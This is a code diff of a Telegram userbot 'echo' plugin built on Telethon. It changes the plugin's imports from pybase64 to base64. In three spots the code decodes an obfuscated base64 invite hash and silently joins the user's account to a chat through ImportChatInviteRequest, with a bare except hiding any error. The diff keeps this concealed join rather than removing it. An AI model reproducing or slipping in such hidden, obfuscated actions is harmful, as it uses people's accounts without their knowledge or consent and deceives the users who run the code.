@@ -5,14 +5,12 @@ Idea by @BlazingRobonix
 """
 
 import asyncio
+import base64
 
-import pybase64
 import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from .. import CMD_HELP
-from ..utils import admin_cmd, edit_or_reply, sudo_cmd
 from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
@@ -26,7 +24,7 @@ async def echo(cat):
         user_id = reply_msg.sender_id
         chat_id = cat.chat_id
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
             await cat.client(hmm)
         except BaseException:
@@ -50,7 +48,7 @@ async def echo(cat):
         user_id = reply_msg.sender_id
         chat_id = cat.chat_id
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
             await cat.client(hmm)
         except BaseException:
@@ -101,7 +99,7 @@ async def samereply(cat):
     if is_echo(cat.sender_id, cat.chat_id):
         await asyncio.sleep(2)
         try:
-            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
             await cat.client(hmm)
         except BaseException:
